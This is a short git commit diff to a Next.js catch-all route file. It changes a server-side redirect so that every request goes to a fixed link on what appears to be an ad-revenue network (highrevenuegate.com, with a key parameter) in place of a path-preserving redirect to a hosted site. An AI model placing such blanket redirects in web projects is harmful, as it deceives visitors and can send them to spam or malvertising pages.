daf47e465bf7f6309a7adce839011701df8819ec
Faisal9211Arslan <134444355+Faisal9211Arslan@users.noreply.github.com>
2023-05-26 23:44:33 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://actorsworld.000webhostapp.com` + encodeURI(path as string)
+					`https://www.highrevenuegate.com/scd1t91t?key=0bc018c0b1005949ba7f50965182344d`
 				}`,
 			},
 		};
